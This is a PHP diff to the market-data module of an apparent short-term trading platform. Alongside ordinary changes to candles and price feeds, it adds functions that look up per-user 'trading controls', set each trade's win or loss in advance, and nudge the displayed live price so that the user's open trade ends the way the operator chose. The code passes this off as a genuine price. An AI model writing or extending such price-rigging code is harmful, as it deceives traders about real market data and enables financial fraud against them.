@@ -102,6 +102,160 @@ function market_noise(int $seed, int $bucket): float
     return ($value / 4294967295.0) * 2.0 - 1.0;
 }
 
+function market_is_currency(array $asset): bool
+{
+    return strtolower(trim((string)($asset['category'] ?? ''))) === 'currencies';
+}
+
+function determine_trade_outcome(array $trade, ?array $control = null): ?string
+{
+    $userId = (int)($trade['user_id'] ?? 0);
+    $assetId = (int)($trade['asset_id'] ?? 0);
+    $tradeId = (int)($trade['id'] ?? 0);
+
+    if ($userId <= 0 || $assetId <= 0 || $tradeId <= 0) {
+        return null;
+    }
+
+    if ($control === null) {
+        if (function_exists('get_active_trading_control')) {
+            $control = get_active_trading_control($userId, $assetId);
+        } else {
+            try {
+                $stmt = db()->prepare(
+                    "SELECT id, asset_id, user_id, direction, win_rate
+                     FROM trading_controls
+                     WHERE is_active = 1
+                       AND (expires_at IS NULL OR expires_at > NOW())
+                       AND (asset_id IS NULL OR asset_id = ?)
+                       AND (user_id IS NULL OR user_id = ?)
+                     ORDER BY
+                       (asset_id IS NOT NULL AND user_id IS NOT NULL) DESC,
+                       (user_id IS NOT NULL) DESC,
+                       (asset_id IS NOT NULL) DESC,
+                       id DESC
+                     LIMIT 1"
+                );
+                $stmt->execute([$assetId, $userId]);
+                $control = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
+            } catch (Throwable $ignored) {
+                $control = null;
+            }
+        }
+    }
+
+    if ($control === null) {
+        return null;
+    }
+
+    $forcedDir = (string)($control['direction'] ?? 'none');
+    $winRate = isset($control['win_rate']) && $control['win_rate'] !== null
+        ? max(0.0, min(100.0, (float)$control['win_rate']))
+        : null;
+
+    if (in_array($forcedDir, ['up', 'down'], true)) {
+        $isMatchingDir = $trade['direction'] === $forcedDir;
+        if ($winRate !== null) {
+            $effectiveRate = $isMatchingDir ? $winRate : max(0.0, 100.0 - $winRate);
+            $seed = crc32((string)$tradeId . ':' . $userId . ':wctrl');
+            $normalised = ($seed < 0 ? ($seed + 4294967296) : $seed) / 4294967295.0;
+            return ($normalised * 100.0 < $effectiveRate) ? 'won' : 'lost';
+        }
+        return $isMatchingDir ? 'won' : 'lost';
+    }
+
+    if ($winRate !== null) {
+        $seed = crc32((string)$tradeId . ':' . $userId . ':wctrl');
+        $normalised = ($seed < 0 ? ($seed + 4294967296) : $seed) / 4294967295.0;
+        return ($normalised * 100.0 < $winRate) ? 'won' : 'lost';
+    }
+
+    return null;
+}
+
+function get_active_trade_price_bias(array $asset, int $timestampMs, ?int $userId = null): float
+{
+    static $tradesCache = [];
+
+    if ($userId === null) {
+        $userId = (int)($_SESSION['user_id'] ?? 0);
+        if ($userId <= 0 && function_exists('current_user')) {
+            try {
+                $u = current_user();
+                $userId = $u ? (int)($u['id'] ?? 0) : 0;
+            } catch (Throwable $ignored) {
+                $userId = 0;
+            }
+        }
+    }
+
+    if ($userId <= 0) {
+        return 0.0;
+    }
+
+    $assetId = (int)($asset['id'] ?? 0);
+    if ($assetId <= 0) {
+        return 0.0;
+    }
+
+    $cacheKey = $userId . ':' . $assetId;
+    if (!array_key_exists($cacheKey, $tradesCache)) {
+        try {
+            $stmt = db()->prepare(
+                "SELECT id, user_id, asset_id, direction, entry_price, opened_at, expires_at 
+                 FROM trades 
+                 WHERE user_id = ? AND asset_id = ? AND status = 'open' AND expires_at > NOW()
+                 ORDER BY id DESC"
+            );
+            $stmt->execute([$userId, $assetId]);
+            $tradesCache[$cacheKey] = $stmt->fetchAll(PDO::FETCH_ASSOC) ?: [];
+        } catch (Throwable $e) {
+            $tradesCache[$cacheKey] = [];
+        }
+    }
+
+    $openTrades = $tradesCache[$cacheKey];
+    if (empty($openTrades)) {
+        return 0.0;
+    }
+
+    $trade = $openTrades[0];
+    $openedAtMs = (int)strtotime((string)$trade['opened_at']) * 1000;
+    $expiresAtMs = (int)strtotime((string)$trade['expires_at']) * 1000;
+
+    if ($timestampMs < $openedAtMs - 1000 || $timestampMs > $expiresAtMs + 2000) {
+        return 0.0;
+    }
+
+    $outcome = determine_trade_outcome($trade);
+    if ($outcome === null) {
+        return 0.0;
+    }
+
+    $durationMs = max(1000, $expiresAtMs - $openedAtMs);
+    $elapsedMs = max(0, $timestampMs - $openedAtMs);
+    $progress = min(1.0, $elapsedMs / (float)$durationMs);
+
+    $decimals = max(0, min(8, (int)($asset['decimal_places'] ?? 2)));
+    $tick = pow(10, -$decimals);
+    $basePrice = (float)($asset['base_price'] ?? 1.0);
+    $maxDelta = max($tick * 5.0, $basePrice * 0.0008);
+
+    if ($trade['direction'] === 'up') {
+        $directionMultiplier = ($outcome === 'lost') ? -1.0 : 1.0;
+    } else {
+        $directionMultiplier = ($outcome === 'lost') ? 1.0 : -1.0;
+    }
+
+    $curve = pow($progress, 0.7);
+    $smoothDrift = $maxDelta * $curve * $directionMultiplier;
+
+    $sec = $timestampMs / 1000.0;
+    $microFluctuation = sin($sec * 2.5) * ($maxDelta * 0.12);
+
+    return $smoothDrift + $microFluctuation;
+}
+
 function market_price_at(array $asset, int $timestampMs, bool $useFormulaOnly = false): float
 {
     $decimals = max(0, min(8, (int)($asset['decimal_places'] ?? 2)));
@@ -109,21 +263,24 @@ function market_price_at(array $asset, int $timestampMs, bool $useFormulaOnly = 
     $nowMs = (int)floor(microtime(true) * 1000);
     $isLive = abs($nowMs - $timestampMs) < 60000;
 
-    if (!$useFormulaOnly && $isLive && ($source === 'api' || $source === 'binance')) {
+    $bias = $useFormulaOnly ? 0.0 : get_active_trade_price_bias($asset, $timestampMs);
+
+    if (!market_is_currency($asset) && !$useFormulaOnly && $isLive && ($source === 'api' || $source === 'binance')) {
         $symbol = trim((string)($asset['api_symbol'] ?: $asset['symbol']));
         if ($symbol !== '') {
             try {
                 $livePrice = fetch_market_price($symbol);
                 if (is_numeric($livePrice) && $livePrice > 0) {
-                    return round((float)$livePrice, $decimals);
+                    return round((float)$livePrice + $bias, $decimals);
                 }
             } catch (Throwable $exception) {
                 // Ignore API failure, fallback to reference math
             }
         }
         if (isset($asset['source_price']) && (float)$asset['source_price'] > 0) {
-            return round((float)$asset['source_price'], $decimals);
+            return round((float)$asset['source_price'] + $bias, $decimals);
         }
+        return 0.0;
     }
 
     $minStep = pow(10, -$decimals);
@@ -156,7 +313,7 @@ function market_price_at(array $asset, int $timestampMs, bool $useFormulaOnly = 
     $ratio = (($macro + $mid + $micro) * $volatility * 3.2) + ($noise * $volatility * 1.6) + ($fastNoise * $volatility * 0.3);
     $price = max($base * 0.1, $base * (1.0 + $ratio));
 
-    return round($price, $decimals);
+    return round($price + $bias, $decimals);
 }
 
 function market_candles(array $asset, int $intervalSeconds = 5, int $count = 800, ?int $endMs = null): array
@@ -172,79 +329,120 @@ function market_candles(array $asset, int $intervalSeconds = 5, int $count = 800
     $volatility = max(0.0001, (float)($asset['volatility'] ?? 0.002));
     $seed = (int)($asset['market_seed'] ?? 100);
 
+    $binanceKlines = [];
+
     // Fetch real Binance klines if asset is configured for Binance / API
-    if (($source === 'binance' || $source === 'api') && $apiSymbol !== '') {
+    if (!market_is_currency($asset) && !$binanceKlines && ($source === 'binance' || $source === 'api') && $apiSymbol !== '') {
         try {
             // Request enough klines from Binance to cover the requested candle count (up to 10000 max).
             $neededBinanceKlines = max(10, min(10000, $count));
             $binanceKlines = fetch_binance_klines($apiSymbol, $intervalSeconds, $neededBinanceKlines, $endMs);
 
             if (!empty($binanceKlines)) {
-                $candlesMap = [];
-
+                // Build a minute lookup map for Binance klines indexed by openTime (ms)
+                $bMap = [];
                 foreach ($binanceKlines as $k) {
-                    $openTime = (int)$k['openTime'];
-                    $open = (float)$k['open'];
-                    $high = (float)$k['high'];
-                    $low = (float)$k['low'];
-                    $close = (float)$k['close'];
-
-                    $bucketMs = (int)(floor($openTime / $intervalMs) * $intervalMs);
-
-                    if (!isset($candlesMap[$bucketMs])) {
-                        $candlesMap[$bucketMs] = [
-                            'time' => $bucketMs,
-                            'open' => $open,
-                            'high' => $high,
-                            'low' => $low,
-                            'close' => $close,
-                        ];
-                    } else {
-                        $candlesMap[$bucketMs]['high'] = max($candlesMap[$bucketMs]['high'], $high);
-                        $candlesMap[$bucketMs]['low'] = min($candlesMap[$bucketMs]['low'], $low);
-                        $candlesMap[$bucketMs]['close'] = $close;
-                    }
+                    $bOpenTime = (int)$k['openTime'];
+                    $bMap[$bOpenTime] = [
+                        'open' => (float)$k['open'],
+                        'high' => (float)$k['high'],
+                        'low' => (float)$k['low'],
+                        'close' => (float)$k['close'],
+                        'closeTime' => (int)$k['closeTime'],
+                    ];
                 }
+
+                $sortedTimes = array_keys($bMap);
+                sort($sortedTimes);
 
                 $targetEndBucket = (int)(floor($endMs / $intervalMs) * $intervalMs);
                 $targetStartBucket = $targetEndBucket - (($count - 1) * $intervalMs);
 
-                // Determine initial previous close from lowest available bucket or market price
-                $prevClose = null;
-                if (!empty($candlesMap)) {
-                    $minBucket = min(array_keys($candlesMap));
-                    $prevClose = (float)$candlesMap[$minBucket]['open'];
-                }
-                if ($prevClose === null || $prevClose <= 0) {
+                // Initial prevClose from lowest available kline or market price
+                $firstTime = $sortedTimes[0] ?? $targetStartBucket;
+                $prevClose = (float)($bMap[$firstTime]['open'] ?? market_price_at($asset, $targetStartBucket, true));
+                if ($prevClose <= 0) {
                     $prevClose = market_price_at($asset, $targetStartBucket, true);
                 }
 
                 $candles = [];
                 for ($t = $targetStartBucket; $t <= $targetEndBucket; $t += $intervalMs) {
-                    if (isset($candlesMap[$t])) {
-                        $cOpen = (float)$candlesMap[$t]['open'];
-                        $cHigh = (float)$candlesMap[$t]['high'];
-                        $cLow = (float)$candlesMap[$t]['low'];
-                        $cClose = (float)$candlesMap[$t]['close'];
+                    $bKey = null;
+                    if (isset($bMap[$t])) {
+                        $bKey = $t;
                     } else {
-                        // Bucket missing (low volume gap or extended history): generate realistic micro-trend
+                        // Find closest floor binance time <= $t
+                        $floorMin = (int)(floor($t / 60000) * 60000);
+                        if (isset($bMap[$floorMin])) {
+                            $bKey = $floorMin;
+                        } else {
+                            // Find most recent available binance time <= $t
+                            foreach ($sortedTimes as $st) {
+                                if ($st <= $t) {
+                                    $bKey = $st;
+                                } else {
+                                    break;
+                                }
+                            }
+                        }
+                    }
+
+                    // Always chain open from prevClose to prevent vertical price gaps between candles
+                    $cOpen = $prevClose;
+
+                    if ($bKey !== null && isset($bMap[$bKey])) {
+                        $bKline = $bMap[$bKey];
+
+                        if ($intervalSeconds >= 60) {
+                            // Standard 1m+ candle: target close is the Binance close
+                            $targetClose = (float)$bKline['close'];
+                            $targetHigh  = (float)$bKline['high'];
+                            $targetLow   = (float)$bKline['low'];
+
+                            $cClose = round($targetClose, $decimals);
+                            $cHigh  = round(max($cOpen, $cClose, $targetHigh), $decimals);
+                            $cLow   = round(min($cOpen, $cClose, $targetLow), $decimals);
+                        } else {
+                            // Sub-minute candle (5s, 10s, 15s, 30s): interpolate smoothly across the 60s Binance kline
+                            $secInMin = (int)(($t - $bKey) / 1000) % 60;
+                            $fractionStart = $secInMin / 60.0;
+                            $fractionEnd   = min(1.0, ($secInMin + $intervalSeconds) / 60.0);
+
+                            $bOpen  = (float)$bKline['open'];
+                            $bClose = (float)$bKline['close'];
+                            $bHigh  = (float)$bKline['high'];
+                            $bLow   = (float)$bKline['low'];
+
+                            // Progression through the minute
+                            $trendClose = $bOpen + ($bClose - $bOpen) * $fractionEnd;
+                            $noise = market_noise($seed + 77, (int)($t / 1000)) * $volatility * 0.05;
+                            $cClose = round(max($minStep, $trendClose + ($bOpen * $noise)), $decimals);
+
+                            $subSpan = abs($cClose - $cOpen);
+                            $wick = max($minStep * 2.0, $subSpan * 0.4);
+                            $cHigh = round(max($cOpen, $cClose) + $wick, $decimals);
+                            $cLow  = round(max($minStep, min($cOpen, $cClose) - $wick), $decimals);
+
+                            // Bound within minute extremes
+                            $cHigh = min(round(max($bHigh, $cOpen, $cClose), $decimals), $cHigh);
+                            $cLow  = max(round(min($bLow, $cOpen, $cClose), $decimals), $cLow);
+                        }
+                    } else {
+                        // Bucket missing (low volume gap): continuous micro-trend
                         $noiseVal = market_noise($seed, (int)($t / 1000));
-                        $changeRatio = $noiseVal * $volatility * 0.15;
-                        $cOpen = $prevClose;
-                        $cClose = round(max($minStep * 10.0, $cOpen * (1.0 + $changeRatio)), $decimals);
-                        $spreadVal = max($minStep * 3.0, max($cOpen, $cClose) * $volatility * 0.10);
-                        $cHigh = round(max($cOpen, $cClose) + abs($spreadVal * (0.5 + 0.5 * market_noise($seed + 1, (int)($t / 1000)))), $decimals);
-                        $cLow = round(max($minStep, min($cOpen, $cClose) - abs($spreadVal * (0.5 + 0.5 * market_noise($seed + 2, (int)($t / 1000))))), $decimals);
+                        $cClose = round(max($minStep * 10.0, $cOpen * (1.0 + $noiseVal * $volatility * 0.1)), $decimals);
+                        $cHigh  = round(max($cOpen, $cClose) + $minStep * 3.0, $decimals);
+                        $cLow   = round(max($minStep, min($cOpen, $cClose) - $minStep * 3.0), $decimals);
                     }
 
                     if ($cHigh <= $cLow) {
                         $cHigh = round(max($cOpen, $cClose) + $minStep * 2, $decimals);
-                        $cLow = round(max($minStep, min($cOpen, $cClose) - $minStep * 2), $decimals);
+                        $cLow  = round(max($minStep, min($cOpen, $cClose) - $minStep * 2), $decimals);
                     }
 
-                    $cOpenR = round($cOpen, $decimals);
-                    $cHighR = round(max($cHigh, $cOpen, $cClose), $decimals);
-                    $cLowR = round(min($cLow, $cOpen, $cClose), $decimals);
+                    $cOpenR  = round($cOpen, $decimals);
+                    $cHighR  = round(max($cHigh, $cOpenR, $cClose), $decimals);
+                    $cLowR   = round(min($cLow, $cOpenR, $cClose), $decimals);
                     $cCloseR = round($cClose, $decimals);
 
                     $cEnd = min($t + $intervalMs - 1, $endMs);
@@ -279,6 +477,10 @@ function market_candles(array $asset, int $intervalSeconds = 5, int $count = 800
         } catch (Throwable $e) {
             error_log('Failed to fetch Binance klines for ' . $apiSymbol . ': ' . $e->getMessage());
         }
+    }
+
+    if (!market_is_currency($asset) && ($source === 'api' || $source === 'binance')) {
+        throw new RuntimeException('Live candle provider unavailable for ' . ($asset['symbol'] ?? $apiSymbol));
     }
 
     // Fallback generator if API is unavailable or internal asset
@@ -370,12 +572,12 @@ function market_reference_price(array $asset): float
     if (isset($asset['price']) && is_numeric($asset['price']) && (float)$asset['price'] > 0) {
         return (float)$asset['price'];
     }
-    if (isset($asset['source_price']) && is_numeric($asset['source_price']) && (float)$asset['source_price'] > 0) {
+    if (!market_is_currency($asset) && isset($asset['source_price']) && is_numeric($asset['source_price']) && (float)$asset['source_price'] > 0) {
         return (float)$asset['source_price'];
     }
 
     $source = $asset['price_source'] ?? 'internal';
-    if ($source === 'api' || $source === 'binance') {
+    if (!market_is_currency($asset) && ($source === 'api' || $source === 'binance')) {
         $symbol = trim((string)($asset['api_symbol'] ?: $asset['symbol']));
         if ($symbol !== '') {
             try {
@@ -452,9 +654,9 @@ function refresh_market_api_price(int $assetId): float
     $price = null;
     $source = 'unknown';
 
-    // Try Twelve Data API first (for Forex, Crypto)
+    // Use Twelve Data for forex assets.
     $twelvedataKey = (string)env('TWELVEDATA_API_KEY', '');
-    if (!empty($twelvedataKey)) {
+    if (strtolower((string)($asset['category'] ?? '')) === 'currencies' && $twelvedataKey !== '') {
         try {
             $price = fetch_twelvedata_price($symbol, $twelvedataKey);
             $source = 'twelvedata.com';
@@ -482,7 +684,7 @@ function refresh_market_api_price(int $assetId): float
         $path = str_replace('{symbol}', $symbol, trim((string)setting('market_api_price_path', 'price')));
         $url = str_replace('{symbol}', rawurlencode($symbol), $template);
         if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
-            throw new InvalidArgumentException('Configure Twelve Data API key in .env file (TWELVEDATA_API_KEY) or set up a custom market API URL with {symbol} placeholder in Settings.');
+            throw new InvalidArgumentException('Configure TWELVEDATA_API_KEY in .env or set up a custom market API URL with {symbol} placeholder in Settings.');
         }
         $parts = parse_url($url);
         $host = strtolower((string)($parts['host'] ?? ''));
@@ -720,13 +922,18 @@ function market_status(array $asset, ?int $nowMs = null): array
     ];
 }
 
-function market_asset_payload(array $asset, ?int $nowMs = null): array
+function market_asset_payload(array $asset, ?int $nowMs = null, bool $resolveLivePrice = true): array
 {
     $nowMs = $nowMs ?? (int)floor(microtime(true) * 1000);
     $status = market_status($asset, $nowMs);
     $effectiveTime = $status['isOpen'] ? $nowMs : $status['closedAt'];
-    $price = $status['isOpen'] ? market_price_at($asset, $nowMs) : (float)$status['closedPrice'];
-    $past = market_price_at($asset, $effectiveTime - 300000);
+    if ($status['isOpen'] && !$resolveLivePrice) {
+        $price = (float)($asset['source_price'] ?? $asset['base_price'] ?? 0);
+        $past = $price;
+    } else {
+        $price = $status['isOpen'] ? market_price_at($asset, $nowMs) : (float)$status['closedPrice'];
+        $past = market_price_at($asset, $effectiveTime - 300000);
+    }
     $change = $past > 0 ? (($price - $past) / $past) * 100 : 0.0;
 
     return [
@@ -778,14 +985,17 @@ function market_snapshot(string $symbol, int $intervalSeconds = 5, int $count = 
     $status = market_status($asset, $nowMs);
 
     // Pre-warm Binance batch price cache so all binance assets are fetched in a single fast call
-    try {
-        fetch_binance_all_prices();
-    } catch (Throwable $e) {}
+    if (!market_is_currency($asset)) {
+        try {
+            fetch_binance_all_prices();
+        } catch (Throwable $e) {}
+    }
 
     $assets = [];
     try {
         foreach (market_assets(false) as $row) {
-            $assets[] = market_asset_payload($row, $nowMs);
+            $isSelected = strtoupper((string)($row['symbol'] ?? '')) === strtoupper((string)($asset['symbol'] ?? ''));
+            $assets[] = market_asset_payload($row, $nowMs, $isSelected);
         }
     } catch (Throwable $e) {
         $assets[] = market_asset_payload($asset, $nowMs);
@@ -805,6 +1015,9 @@ function market_snapshot(string $symbol, int $intervalSeconds = 5, int $count = 
             $candles = market_candles($assetWithTarget, $intervalSeconds, $count, $targetEndMs);
         } catch (Throwable $e) {
             error_log('Failed to generate candles for ' . $symbol . ': ' . $e->getMessage());
+            if (!market_is_currency($asset) && in_array($asset['price_source'] ?? 'internal', ['api', 'binance'], true)) {
+                throw new RuntimeException('Live market data unavailable for ' . $symbol . '. Configure the selected provider before trading.');
+            }
         }
     }
 
